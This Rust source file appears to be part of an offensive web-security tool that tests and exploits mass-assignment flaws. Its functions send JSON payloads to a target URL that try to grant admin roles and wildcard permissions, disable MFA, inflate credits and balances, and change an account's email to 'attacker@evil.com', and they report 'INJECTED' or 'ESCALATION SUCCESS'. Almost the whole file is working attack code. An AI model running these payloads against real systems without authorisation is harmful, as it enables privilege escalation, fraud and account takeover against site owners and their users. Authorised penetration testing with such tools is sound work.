use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn check(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} Mass Assignment Vulnerability Check",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        ("Role escalation", r#"{"role":"admin"}"#),
        ("Admin flag", r#"{"isAdmin":true}"#),
        ("Is staff", r#"{"isStaff":true}"#),
        ("Verified", r#"{"verified":true}"#),
        ("Active", r#"{"active":true}"#),
        ("Plan upgrade", r#"{"plan":"enterprise"}"#),
        ("Credits", r#"{"credits":99999}"#),
        ("Balance", r#"{"balance":1000000}"#),
    ];

    for (name, payload) in &payloads {
        match client
            .post(url)
            .header("Content-Type", "application/json")
            .body(*payload)
            .send()
            .await
        {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200
                    && (text.contains("admin") || text.contains("true") || text.contains("success"))
                {
                    println!("  {} {:20} — ACCEPTED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Mass Assignment Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let inject_payloads = [
        ("Nested role", r#"{"profile":{"role":"admin"}}"#),
        (
            "Permissions",
            r#"{"permissions":["admin","read","write","delete"]}"#,
        ),
        ("Group override", r#"{"group":"administrators"}"#),
        ("Scope expand", r#"{"scope":"global"}"#),
        ("Trust level", r#"{"trustLevel":5}"#),
        ("MFA disable", r#"{"mfaEnabled":false}"#),
        ("Password reset", r#"{"passwordChanged":true}"#),
        ("Email change", r#"{"email":"attacker@evil.com"}"#),
    ];

    for (name, payload) in &inject_payloads {
        match client
            .put(url)
            .header("Content-Type", "application/json")
            .body(*payload)
            .send()
            .await
        {
            Ok(r) => {
                let status = r.status().as_u16();
                let _text = r.text().await.unwrap_or_default();
                if status == 200 || status == 201 {
                    println!("  {} {:20} — INJECTED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn escalate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!(
        "{} Mass Assignment Privilege Escalation",
        "[*]".cyan().bold()
    );
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let escalate_payloads = [
        (
            "Full admin",
            r#"{"role":"admin","isAdmin":true,"permissions":["*"],"verified":true}"#,
        ),
        (
            "Superuser",
            r#"{"role":"superuser","isStaff":true,"active":true,"trustLevel":99}"#,
        ),
        (
            "Root",
            r#"{"role":"root","group":"administrators","scope":"global"}"#,
        ),
        (
            "God mode",
            r#"{"role":"admin","isAdmin":true,"isStaff":true,"verified":true,"active":true,"plan":"enterprise","credits":99999}"#,
        ),
    ];

    for (name, payload) in &escalate_payloads {
        match client
            .patch(url)
            .header("Content-Type", "application/json")
            .body(*payload)
            .send()
            .await
        {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && (text.contains("admin") || text.contains("success")) {
                    println!("  {} {:20} — ESCALATION SUCCESS", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn enumerate(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Mass Assignment Field Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let fields = [
        "role",
        "isAdmin",
        "isStaff",
        "isSuperuser",
        "permissions",
        "group",
        "scope",
        "trustLevel",
        "verified",
        "active",
        "plan",
        "credits",
        "balance",
        "mfaEnabled",
        "passwordChanged",
        "email",
        "phone",
        "apiKey",
        "secret",
        "token",
        "accessLevel",
        "clearance",
        "department",
    ];

    let mut accepted = 0u32;
    for field in &fields {
        let payload = format!(r#"{{"{}":"test"}}"#, field);
        if let Ok(r) = client
            .post(url)
            .header("Content-Type", "application/json")
            .body(payload)
            .send()
            .await
        {
            let status = r.status().as_u16();
            if status == 200 || status == 201 {
                println!("  {} {:20} — accepted", "[+]".green().bold(), field);
                accepted += 1;
            }
        }
    }

    println!(
        "\n  {} {} fields accepted out of {} tested",
        "[*]".cyan().bold(),
        accepted,
        fields.len()
    );
    if accepted > 10 {
        println!(
            "  {} Many fields writable — high mass assignment risk",
            "[!]".red().bold()
        );
    }

    Ok(())
}
